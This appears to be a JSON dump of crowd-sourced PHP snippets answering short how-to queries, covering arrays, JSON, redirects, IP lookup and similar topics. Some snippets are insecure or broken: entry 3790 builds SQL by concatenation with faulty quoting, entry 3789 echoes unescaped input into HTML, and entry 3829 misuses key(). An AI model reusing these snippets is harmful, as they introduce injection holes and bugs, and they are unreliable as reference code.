    "description": "ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL); \n/* Display all errors like dev */ ini_set('display_errors', 1); ini_set('display_startup_errors', 1); error_reporting(E_ALL);  /* Display PROD errors */ ini_set('display_errors', 1); ini_set('display_startup_errors', 0); error_reporting(E_ALL & ~E_NOTICE);  /* OTHER SETTINGS*/  // Report simple running errors error_reporting(E_ERROR | E_WARNING | E_PARSE);  // Reporting E_NOTICE  error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);  // Report all errors except E_NOTICE error_reporting(E_ALL & ~E_NOTICE); // For PHP < 5.3 error_reporting(E_ALL ^ E_NOTICE);  // Report all PHP errors error_reporting(E_ALL); //or error_reporting(-1); //or error_reporting(0);\n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3785,
    "keyword": null,
    "link": null,
    "title": " php ini set timeout",
    "description": "//place this before any script you want to calculate time $time_start = microtime(true);   //sample script for($i=0; $i<1000; $i++){  //do anything }  $time_end = microtime(true); $execution_time = ($time_end - $time_start); echo '<b>Total Execution Time:</b> '.($execution_time*1000).'Milliseconds'; \nset_time_limit(0); \n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3786,
    "keyword": null,
    "link": null,
    "title": " php initialize array",
    "description": "// Initialize Empty Array (PHP 5.4 and higher) $myArray = [];  // Initialize Empty Array (Before PHP 5.4) $myArray = array();\n <?php // array(0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12) foreach (range(0, 12) as $number) {     echo $number; }  // The step parameter // array(0, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100) foreach (range(0, 100, 10) as $number) {     echo $number; }  // Usage of character sequences // array('a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i'); foreach (range('a', 'i') as $letter) {     echo $letter; } // array('c', 'b', 'a'); foreach (range('c', 'a') as $letter) {     echo $letter; } ?>  \n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3787,
    "keyword": null,
    "link": null,
    "title": " php inline if",
    "description": "$result = ($data->status == 1) ? 'active' : 'disable'\n/* most basic usage */ $var = 5; $var_is_greater_than_two = ($var > 2 ? true : false); // returns true\n<?php if ($requestVars->_name == '') echo $redText; ?>\n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3788,
    "keyword": null,
    "link": null,
    "title": " php inline if null check",
    "description": "$username = null; $name = $username ?? 'unknown'; # Use unknown as name if the username variable isn't set.\n",
    "reg_date": "2021-10-12T10:18:36.000Z"
  },
  {
    "id": 3789,
    "keyword": null,
    "link": null,
    "title": " php input field",
    "description": "Name: <input type=\"text\" name=\"name\" value=\"<?php echo $name;?>\">\n $_MYSQL_DATA = array();  while($row = mysqli_fetch_assoc($qry))  {     $_MYSQL_DATA[] = $row;  } \n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3790,
    "keyword": null,
    "link": null,
    "title": " php insert array into mysql table",
    "description": "$matstring=implode(\"','\",$matrix[1]); mysql_query('INSERT INTO Australia (Price, Company, Days, Weight) VALUES ('$matstring')');\n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3791,
    "keyword": null,
    "link": null,
    "title": " php insert character into string",
    "description": "$newstr = substr_replace($oldstr, $str_to_insert, $pos, 0);\n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3792,
    "keyword": null,
    "link": null,
    "title": " php insert hyphen into spaces in string",
    "description": "$test = \"jjfnj 948\"; $test = str_replace(\" \", \"\", $test);  // strip all spaces from string echo substr($test, 0, 3).\"-\".substr($test, 3);  // isolate first three chars, add hyphen, and concat all characters after the first three \n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3793,
    "keyword": null,
    "link": null,
    "title": " php inside html tag",
    "description": "<?php   $param = \"test\"; ?> <a href=\"http://www.whatever.com/<?php echo $param; ?>\">Click Here</a> \n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3794,
    "keyword": null,
    "link": null,
    "title": " php install dependency",
    "description": "php composer.phar update\n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3795,
    "keyword": null,
    "link": null,
    "title": " php install xdebug mac",
    "description": "# intel hardware pecl install xdebug  # M1 hardware arch -x86_64 sudo pecl install xdebug\n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3796,
    "keyword": null,
    "link": null,
    "title": " php instanceof",
    "description": " <?php /*  *   * opcode number: 138  */ $obj = new A();  if ($obj instanceof A) {    echo 'A'; } ?>  \nclass MyClass { }  $o1 = new MyClass(); $o2 = new MyClass(); $name = 'MyClass';  // in the cases below, $a gets boolean value true $a = $o1 instanceof MyClass; $a = $o1 instanceof $name; $a = $o1 instanceof $o2;  // counter examples: $b = 'b'; $a = $o1 instanceof 'MyClass'; // parse error: constant not allowed $a = false instanceof MyClass; // fatal error: constant not allowed $a = $b instanceof MyClass;    // false ($b is not an object) \n<?php class MyClass {} class AnotherClass extends MyClass{} $obj = new AnotherClass();  if($obj instanceof AnotherClass) {   echo \"The object is AnotherClass\"; } // The object is also an instance of the class it is derived from if($obj instanceof MyClass) {   echo \"The object is MyClass<br>\"; } ?>\n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3797,
    "keyword": null,
    "link": null,
    "title": " php int min",
    "description": "PHP_INT_MAX (int) // The largest integer supported in this build of PHP.     PHP_INT_MIN (int) // The smallest integer supported in this build of PHP.\n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3798,
    "keyword": null,
    "link": null,
    "title": " php int to string",
    "description": "return strval($integer);\n$number = 11; // This echo strval($number); // Or This echo (String) $number; // Output // \"11\" // \"11\"\n$var = 5;  // Inline variable parsing echo \"I'd like {$var} waffles\"; // = \"I'd like 5 waffles  // String concatenation  echo \"I'd like \".$var.\" waffles\"; // I'd like 5 waffles  // Explicit cast  $items = (string)$var; // $items === \"5\";  // Function call $items = strval($var); // $items === \"5\"; \n$num = \"3.14\";  $int = (int)$num;//string to int $float = (float)$num;//string to float\n$myintvariable = intval($myvariable);\nphpCopy<?php   $variable = 10; $string1 = strval($variable); echo \"The variable is converted to a string and its value is $string1.\";   ?> \n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3799,
    "keyword": null,
    "link": null,
    "title": " php interface vs abstract class",
    "description": "Use an interface when you want to force developers working in your  system (yourself included) to implement a set number of methods on the  classes they'll be building. Use an abstract class when you want to force developers working in your  system (yourself included) to implement a set numbers of methods and you  want to provide some base methods that will help them develop their child  classes. Another thing to keep in mind is client classes can only extend one abstract  class, whereas they can implement multiple interfaces. So, if you're  defining your behavior contracts in abstract classes, that means each child  class may only conform to a single contract. Sometimes this a good thing,  when you want to force your user-programmers along a particular path. Other  times it would be bad. Imagine if PHP's Countable and Iterator interfaces  were abstract classes instead of interfaces. One approach that's common when you're uncertain which way to go (as  mentioned by cletus below) is to create an interface, and then have your  abstract class implement that interface. \n      \n",
    "reg_date": "2021-10-12T10:18:37.000Z"
  },
  {
    "id": 3800,
    "keyword": null,
    "link": null,
    "title": " php internship interview questions",
    "description": "$a = '1'; $b = &$a; $b = \"2$b\"; echo $a.\", \".$b; \n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3801,
    "keyword": null,
    "link": null,
    "title": " php interview qestion for experiance",
    "description": "$a = '1'; $b = &$a; $b = \"2$b\"; echo $a.\", \".$b; \n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3802,
    "keyword": null,
    "link": null,
    "title": " php ip",
    "description": "$ip = $_SERVER['REMOTE_ADDR'];\n$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n// Function to get the client IP address function get_client_ip() {     $ipaddress = '';     if (getenv('HTTP_CLIENT_IP'))         $ipaddress = getenv('HTTP_CLIENT_IP');     else if(getenv('HTTP_X_FORWARDED_FOR'))         $ipaddress = getenv('HTTP_X_FORWARDED_FOR');     else if(getenv('HTTP_X_FORWARDED'))         $ipaddress = getenv('HTTP_X_FORWARDED');     else if(getenv('HTTP_FORWARDED_FOR'))         $ipaddress = getenv('HTTP_FORWARDED_FOR');     else if(getenv('HTTP_FORWARDED'))        $ipaddress = getenv('HTTP_FORWARDED');     else if(getenv('REMOTE_ADDR'))         $ipaddress = getenv('REMOTE_ADDR');     else         $ipaddress = 'UNKNOWN';     return $ipaddress; }\nif($_SERVER[\"REMOTE_ADDR\"]=='111.111.111.111'){ //run only my ip }\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3803,
    "keyword": null,
    "link": null,
    "title": " php ip address of visitor",
    "description": "$clientIPAddress=$_SERVER['REMOTE_ADDR']; \n<?PHP  function getUserIP() {     // Get real visitor IP behind CloudFlare network     if (isset($_SERVER[\"HTTP_CF_CONNECTING_IP\"])) {               $_SERVER['REMOTE_ADDR'] = $_SERVER[\"HTTP_CF_CONNECTING_IP\"];               $_SERVER['HTTP_CLIENT_IP'] = $_SERVER[\"HTTP_CF_CONNECTING_IP\"];     }     $client  = @$_SERVER['HTTP_CLIENT_IP'];     $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];     $remote  = $_SERVER['REMOTE_ADDR'];      if(filter_var($client, FILTER_VALIDATE_IP))     {         $ip = $client;     }     elseif(filter_var($forward, FILTER_VALIDATE_IP))     {         $ip = $forward;     }     else     {         $ip = $remote;     }      return $ip; }   $user_ip = getUserIP();  echo $user_ip; // Output IP address [Ex: 177.87.193.134]   ?>\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3804,
    "keyword": null,
    "link": null,
    "title": " php is day light saving time",
    "description": "if(date('I')){ \techo \"We are in daylight saving time\"; }else{ \techo \"We are NOT in daylight saving time\"; }\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3805,
    "keyword": null,
    "link": null,
    "title": " php is daylight savings",
    "description": "if(date('I')){ \techo \"We are in daylight saving time\"; }else{ \techo \"We are NOT in daylight saving time\"; }\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3806,
    "keyword": null,
    "link": null,
    "title": " php is divisible by",
    "description": "if($number % 15 == 0)  {     echo \"BY3 AND 5\"; } elseif ($number % 5 == 0) {     echo \"BY5\"; } elseif ($number % 3 == 0) {     echo \"BY3\"; }\nif ($variable % 30 == 0) {     echo 'This number is divisible by 30.'; };\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3807,
    "keyword": null,
    "link": null,
    "title": " php is numeric",
    "description": "$var_num = \"1\"; $var_str = \"Hello World\";  var_dump( is_numeric($var_num), is_numeric($var_str) );  /*  Output -  bool(true)  bool(false) */\n//is_numeric &mdash; Finds whether a variable is a number or a numeric string is_numeric ( $variable ); // returns true or false\nif(is_numeric($what_am_i)){ \t//true }  \nis_int(mixed $value): bool\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3808,
    "keyword": null,
    "link": null,
    "title": " php is object",
    "description": "is_object($var)\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3809,
    "keyword": null,
    "link": null,
    "title": " php is string",
    "description": "is_string($var)\n",
    "reg_date": "2021-10-12T10:18:38.000Z"
  },
  {
    "id": 3810,
    "keyword": null,
    "link": null,
    "title": " php is variable a number",
    "description": "$var_num = \"1\"; $var_str = \"Hello World\";  var_dump( is_numeric($var_num), is_numeric($var_str) );  /*  Output -  bool(true)  bool(false) */\n//is_numeric &mdash; Finds whether a variable is a number or a numeric string is_numeric ( $variable ); // returns true or false\nif(is_numeric($what_am_i)){ \t//true }  \n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3811,
    "keyword": null,
    "link": null,
    "title": " php isarray",
    "description": " <?php $yes = array('this', 'is', 'an array');  echo is_array($yes) ? 'Array' : 'not an Array'; echo \"\\n\";  $no = 'this is a string';  echo is_array($no) ? 'Array' : 'not an Array'; ?>  \n$id = 1; $age = 2;     $sort = \"id\"; // or \"age\";     $Key = $$sort; $arr = array($Key => 'string');  print_r($arr);\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3812,
    "keyword": null,
    "link": null,
    "title": " php isset post",
    "description": "if (!empty($_POST[\"mail\"])) {     echo \"Yes, mail is set\";     } else {       echo \"No, mail is not set\"; }\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3813,
    "keyword": null,
    "link": null,
    "title": " php iterate array keys",
    "description": "foreach ($arr as $key => $value) {     echo \"{$key} => {$value} \";     print_r($arr); }\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3814,
    "keyword": null,
    "link": null,
    "title": " php iterate folder",
    "description": "// Shows us all files and directories in directory except \".\" and \"..\".  foreach (new DirectoryIterator('../moodle') as $fileInfo) {     if($fileInfo->isDot()) continue;     echo $fileInfo->getFilename() . \"<br>\\n\"; }\nif ($handle = opendir('.')) {      while (false !== ($entry = readdir($handle))) {          if ($entry != \".\" && $entry != \"..\") {              echo \"$entry\\n\";         }     }      closedir($handle); }\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3815,
    "keyword": null,
    "link": null,
    "title": " php iterate through array",
    "description": "$clothes = array(\"hat\",\"shoe\",\"shirt\"); foreach ($clothes as $item) { \techo $item; }\n$arr = ['Item 1', 'Item 2', 'Item 3'];  foreach ($arr as $item) {   var_dump($item); }\n$ar = ['Rudi', 'Morie', 'Halo', 'Miki'];  for ($i=0, $len=count($ar); $i<$len; $i++) {     echo \"$ar[$i] \\n\"; } /* Rudi  Morie  Halo  Miki  */\nforeach (array_expression as $value)     statement foreach (array_expression as $key => $value)     statement\n<?php // Declare an array  $arr = array(\"green\", \"blue\", \"pink\", \"white\");      // Loop through the array elements  foreach ($arr as $element) {      echo \"$element \";  }  ?>\n<?php $arr = array(1, 2, 3, 4); foreach ($arr as &$value) {     $value = $value * 2; } // $arr is now array(2, 4, 6, 8) unset($value); // break the reference with the last element ?>\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3816,
    "keyword": null,
    "link": null,
    "title": " php iterate thru object",
    "description": "foreach ($obj as $key => $value) {     echo \"$key => $value\\n\";     //echo \"test greper\"; } \nforeach ($obj as $key => $value) {     echo \"$key => $value\\n\"; }\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3817,
    "keyword": null,
    "link": null,
    "title": " php jquery plus 1 day",
    "description": "var date = new Date();  // add a day date.setDate(date.getDate() + 1);\n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3818,
    "keyword": null,
    "link": null,
    "title": " php json decode",
    "description": "<?php $data = ['name' => 'John', 'age' => 35]; header('Content-type: Application/json'); echo json_encode($data); \n$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n$json = json_decode(file_get_contents('/path/to/your/file.json'));\n$postedData = $_POST[\"JSONfullInfoArray\"]; $tempData = str_replace(\"\\\\\", \"\",$postedData); $cleanData = json_decode($tempData); var_dump($cleanData);\n// Checks if json function isJson($string) {    json_decode($string);    return json_last_error() === JSON_ERROR_NONE; }  // example if (isJson($string) {   // Do your stuff here }\njson_encode used when PHP retrieve data and convert Array() to [] !!!! $arr = array('a' => 1, 'b' => 2, 'c' => 3, 'd' => 4, 'e' => 5); echo json_encode($arr); //output {\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5} access from js file data.a, data.b,data.c... ----------------------------------------------   $json = '{\"a\":1,\"b\":2,\"c\":3,\"d\":4,\"e\":5}'; json_decode($json, true); //true turns object to associative array;  //output array(5) {     [\"a\"] => int(1)     [\"b\"] => int(2)     [\"c\"] => int(3)     [\"d\"] => int(4)     [\"e\"] => int(5) }  \n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3819,
    "keyword": null,
    "link": null,
    "title": " php json encode",
    "description": "<?php $data = ['name' => 'John', 'age' => 35]; header('Content-type: Application/json'); echo json_encode($data); \n$personJSON = '{\"name\":\"Johny Carson\",\"title\":\"CTO\"}';  $person = json_decode($personJSON);  echo $person->name; // Johny Carson\n// Don't wrap the json_encode result in quotes var data = <?php echo json_encode($serializedData) ?>; \n$person = array(      \"name\" => \"Johny Carson\",      \"title\" => \"CTO\" );  $personJSON=json_encode($person);//returns JSON string\njson_encode(['name' => 'Jake', 'country' => 'Philippines'])\n $array = array();  $array['Name'] = 'Alex'; $array['Age'] = 37; $array['Admin'] = TRUE;  $array['Contact'] = array (   'Site' => \"alexwebdevelop.com\",   'Phone' => 123456789,   'Address' => NULL );  $array['Tags'] = array('php', 'web', 'dev');  $json = json_encode($array, JSON_PRETTY_PRINT);  echo '<pre>'; echo $json; echo '</pre>';  \n",
    "reg_date": "2021-10-12T10:18:39.000Z"
  },
  {
    "id": 3820,
    "keyword": null,
    "link": null,
    "title": " php json encode header detail",
    "description": " $array = array();  $array['Name'] = 'Alex'; $array['Age'] = 37; $array['Admin'] = TRUE;  $array['Contact'] = array (   'Site' => \"alexwebdevelop.com\",   'Phone' => 123456789,   'Address' => NULL );  $array['Tags'] = array('php', 'web', 'dev');  $json = json_encode($array, JSON_PRETTY_PRINT);  echo '<pre>'; echo $json; echo '</pre>';  \n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3821,
    "keyword": null,
    "link": null,
    "title": " php json pretty print",
    "description": "print(\"<pre>\".print_r($array_data,true).\"</pre>\"); \n$json_string = json_encode($data, JSON_PRETTY_PRINT);\nheader('Content-Type: application/json');   JSON_UNESCAPED_UNICODE | JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES\n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3822,
    "keyword": null,
    "link": null,
    "title": " php json request get value",
    "description": "//e.g your JSON Req is like this {\"UserName\":\"Ranish\",\"Password\":\"asdasdasd\"} $jsonReqUrl  = \"php://input\"; $reqjson = file_get_contents($jsonReqUrl); $reqjsonDecode = json_decode($reqjson, true); echo $reqjsonDecode['UserName'];\n<?php $jsonurl = \"https://reqres.in/api/users/2\"; $json = file_get_contents($jsonurl); $jsonDecode = json_decode($json, true); echo $jsonDecode['data']['email']; ?>\n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3823,
    "keyword": null,
    "link": null,
    "title": " php json request get value of an array element",
    "description": "<?php $jsonurl = \"https://reqres.in/api/users/2\"; $json = file_get_contents($jsonurl); $jsonDecode = json_decode($json, true); echo $jsonDecode['data']['email']; ?>\n<?php $jsonurl = \"https://reqres.in/api/users?page=2\"; $json = file_get_contents($jsonurl); $jsonDecode = json_decode($json, true); var_dump($jsonDecode['data']); foreach($jsonDecode['data'] as $mydata){     echo $mydata['email'] . \"<br>\"; } ?>\n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3824,
    "keyword": null,
    "link": null,
    "title": " php json response to ajax",
    "description": "header('Content-Type: application/json');   $colors = array(\"red\",\"blue\",\"green\"); echo json_encode($colors);\n <?php  echo json_encode($data); ?>  \n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3825,
    "keyword": null,
    "link": null,
    "title": " php json string to associative array",
    "description": "$assocArray = json_decode($data, true);\n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3826,
    "keyword": null,
    "link": null,
    "title": " php keep only numbers in string",
    "description": "$str = preg_replace('/[^0-9.]+/', '', $str);\n$str = 'In My Cart : 11 items'; $int = (int) filter_var($str, FILTER_SANITIZE_NUMBER_INT);\n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3827,
    "keyword": null,
    "link": null,
    "title": " php key exists",
    "description": "// Here's our fruity array $fruits = ['apple', 'pear', 'banana'];  // Use it in an `if` statement if (array_key_exists(\"banana\", $fruits)) {  // Do stuff because `banana` exists }  // Store it for later use $exists = array_key_exists(\"peach\", $fruits);\n <?php $search_array = array('first' => null, 'second' => 4);  // returns false isset($search_array['first']);  // returns true array_key_exists('first', $search_array); ?>  \n <?php $search_array = array('first' => 1, 'second' => 4); if (array_key_exists('first', $search_array)) {     echo \"The 'first' element is in the array\"; } ?>  \n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3828,
    "keyword": null,
    "link": null,
    "title": " php key in array exists",
    "description": "// Here's our fruity array $fruits = ['apple', 'pear', 'banana'];  // Use it in an `if` statement if (array_key_exists(\"banana\", $fruits)) {  // Do stuff because `banana` exists }  // Store it for later use $exists = array_key_exists(\"peach\", $fruits);\n <?php $search_array = array('first' => null, 'second' => 4);  // returns false isset($search_array['first']);  // returns true array_key_exists('first', $search_array); ?>  \n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3829,
    "keyword": null,
    "link": null,
    "title": " php keys of array",
    "description": "<?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  $keys = array_keys($array);\t\t// return array $values = array_values($array);\t// return array ?>\n$array = array(0 => 100, \"cor\" => \"vermelho\"); print_r(array_keys($array));  $array = array(\"azul\", \"vermelho\", \"verde\", \"azul\", \"azul\"); print_r(array_keys($array, \"azul\"));  $array = array(\"cor\"     => array(\"azul\", \"vermelho\", \"verde\"),                \"tamanho\" => array(\"pequeno\", \"medio\", \"grande\")); print_r(array_keys($array)); \n<?php $age=array(\"Peter\"=>\"35\",\"Ben\"=>\"37\",\"Joe\"=>\"43\"); foreach($age as $x=>$x_value)   {   echo \"Key=\" . $x . \", Value=\" . $x_value;   echo \"<br>\";   } ?>\n <?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  // this cycle echoes all associative array // key where value equals \"apple\" for($i = 0; $i< sizeof($array);$i++){ if (key($array[$i]) == 'apple') {         echo key($array).'<br />';     }     //next($array); } ?>  \n <?php $array = array(     'fruit1' => 'apple',     'fruit2' => 'orange',     'fruit3' => 'grape',     'fruit4' => 'apple',     'fruit5' => 'apple');  // this cycle echoes all associative array // key where value equals \"apple\" while ($fruit_name = current($array)) {     if ($fruit_name == 'apple') {         echo key($array).'<br />';     }     next($array); } ?>  \n",
    "reg_date": "2021-10-12T10:18:40.000Z"
  },
  {
    "id": 3830,
    "keyword": null,
    "link": null,
    "title": " php konstanten",
    "description": "// Gueltige Namen fuer Konstanten define(\"FOO\",     \"irgendwas\"); define(\"FOO2\",    \"etwas anderes\"); define(\"FOO_BAR\", \"irgendwas ganz anderes\");\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3831,
    "keyword": null,
    "link": null,
    "title": " php laravel dump",
    "description": "// Add in blade template file {{ dd($YourPassedVariable) }}\n$users = User::all(); dump($users);  echo \"shouts\";\n// dump <?php dump($array)?> // dump and die <?php dd($array)?>\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3832,
    "keyword": null,
    "link": null,
    "title": " php last day of month",
    "description": "$lastDay = date('t',strtotime('last month'));  print_r($lastDay);\n$lastDateOfNextMonth =strtotime('last day of next month') ;  $lastDay = date('d/m/Y', $lastDateOfNextMonth);     print_r($lastDay);\n$a_date = \"2009-11-23\"; echo date(\"Y-m-t\", strtotime($a_date));\n//Last month $lastMonth = Date(\"F\", strtotime(\"first day of previous month\"); $nextMonth = Date(\"F\", strtotime(\"first day of next month\");\nif(gmdate('t') == gmdate('d')){     echo 'Last day of the month.'; }\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3833,
    "keyword": null,
    "link": null,
    "title": " php last item of array",
    "description": "<?php  $source_array = ['key1' => 'value1', 'key2' => 'value2', 'key3' => 'value3'];  $result = end($source_array);  echo \"Last element: \".$result;  ?>\n<?php  $source_array = [   'key1' => 'value1',   'key2' => 'value2',   'key3' => 'value3' ];  echo \"Last index: \" . array_key_last($source_array);  ?>\necho end(['Gon', 'Killua', 'Hisoka']) // print Hisoka\nend($arr)\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3834,
    "keyword": null,
    "link": null,
    "title": " php length of array",
    "description": "<?php \t$arr = [\"one\", \"two\", \"three\", \"four\"]; \techo count($arr);   ?>\ncount($myArray);\n// using count() we can get proper length of the array $names = array(\"Ankur\",\"Raj\",\"Ram\",\"Suresh\"); // pass array into count() as parameter it will return array length echo count($names);  // output : 4\n<?php $cars=array(\"Volvo\",\"BMW\",\"Toyota\"); echo count($cars); ?>\necho count($my_array); echo sizeof($my_array);    // alias\n<?php   //use count($var) -> $a[0] = 1; $a[1] = 3; $a[2] = 5; var_dump(count($a));\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3835,
    "keyword": null,
    "link": null,
    "title": " php limit string length",
    "description": "$result = substr(\"Hello How are you\", 0, 5); //first 5 chars \"Hello\"\nif (strlen($str) > 10)    $str = substr($str, 0, 7) . '...';\n<?php $name = 'abcdef'; echo strlen($str); // 6  $string = ' ab cd '; echo strlen($str); // 7 ?>\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3836,
    "keyword": null,
    "link": null,
    "title": " php line break in echo",
    "description": "echo \"Thanks for your email\" .\"<br>\". \"Your orders details are below:\" \n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3837,
    "keyword": null,
    "link": null,
    "title": " php link to page",
    "description": "echo ' <a href=\"index1.php\">page1</a>'; echo '<a href=\"page2.php\">page2</a>';\nheader(\"Location: https://example.com\");  \n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3838,
    "keyword": null,
    "link": null,
    "title": " php list all constants",
    "description": "print_r(get_defined_constants());\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3839,
    "keyword": null,
    "link": null,
    "title": " php list directories",
    "description": "$path    = './'; $files = scandir($path); $files = array_diff(scandir($path), array('.', '..')); foreach($files as $file){   echo \"<a href='$file'>$file</a>\"; }\nif ($handle = opendir('.')) {      while (false !== ($entry = readdir($handle))) {          if ($entry != \".\" && $entry != \"..\") {              echo \"$entry\\n\";         }     }      closedir($handle); }\nforeach(glob('includes/*.php') as $file) {     ... }\n$dir = '.'; $directories = glob($dir . '/*', GLOB_ONLYDIR);\nscandir ( string $directory [, int $sorting_order = SCANDIR_SORT_ASCENDING [, resource $context ]] ) : array\n",
    "reg_date": "2021-10-12T10:18:41.000Z"
  },
  {
    "id": 3840,
    "keyword": null,
    "link": null,
    "title": " php list output images in a directory",
    "description": "<?php  echo scanDirectoryImages(\"uploads\");  /** * Recursively search through directory for images and display them *  * @param  array  $exts * @param  string $directory * @return string */ function scanDirectoryImages($directory, array $exts = array('jpeg', 'jpg', 'gif', 'png')) { if (substr($directory, -1) == '/') {     $directory = substr($directory, 0, -1); } $html = ''; if (     is_readable($directory)     && (file_exists($directory) || is_dir($directory)) ) {     $directoryList = opendir($directory);     while($file = readdir($directoryList)) {         if ($file != '.' && $file != '..') {             $path = $directory . '/' . $file;             if (is_readable($path)) {                 if (is_dir($path)) {                     return scanDirectoryImages($path, $exts);                 }                 if (                     is_file($path)                     && in_array(end(explode('.', end(explode('/', $path)))),   $exts)                 ) {                     $html .= '<a href=\"' . $path . '\"><img src=\"' . $path                         . '\" style=\"max-height:100px;max-width:100px\" />  </a>';                 }             }         }     }     closedir($directoryList); } return $html; }\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3841,
    "keyword": null,
    "link": null,
    "title": " php load specific post id on language",
    "description": "// 1- retrieve the right post ID $my_postid = apply_filters( 'wpml_object_id', 1416 , 'post', false ); //wpml $my_postid = icl_object_id(1416 , 'post', false ); //polylang @deprecated  $content_post = get_post($my_postid); // 2-use post id\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3842,
    "keyword": null,
    "link": null,
    "title": " php location",
    "description": "<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n<?php header('Location: http://www.example.com/');\n<?php // This will just redirect you to example.com $url = \"https://example.com\"; header(\"Location: $url\");   ?>\n<?php /* \tThis will redirect  to facebook.com */ $url = \"https://facebook.com.com\"; header(\"Location: $url\");   exit; ?>\n <html> <?php /* This will give an error. Note the output  * above, which is before the header() call */ header('Location: http://www.example.com/'); exit; ?>  \n/* This will just redirect you to example.com */  <?php $url = \"https://example.com\"; header(\"Location: $url\");   exit; ?>  /* I hope it will help you. Namaste */\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3843,
    "keyword": null,
    "link": null,
    "title": " php location header not working",
    "description": "header() must be called before any actual output is sent, either by normal HTML tags, blank lines in a file, or from PHP\n// add this lines in .htaccess file php_value display_errors 1 php_flag output_buffering on\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3844,
    "keyword": null,
    "link": null,
    "title": " php location same page",
    "description": "header(\"Location: \" . \"http://\" . $_SERVER['HTTP_HOST'] . $location);\n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3845,
    "keyword": null,
    "link": null,
    "title": " php login google api",
    "description": "$composer require google/apiclient:\"^2.0\" \n",
    "reg_date": "2021-10-12T10:18:42.000Z"
  },
  {
    "id": 3846,
    "keyword": null,
    "link": null,
    "title": " php loop array",
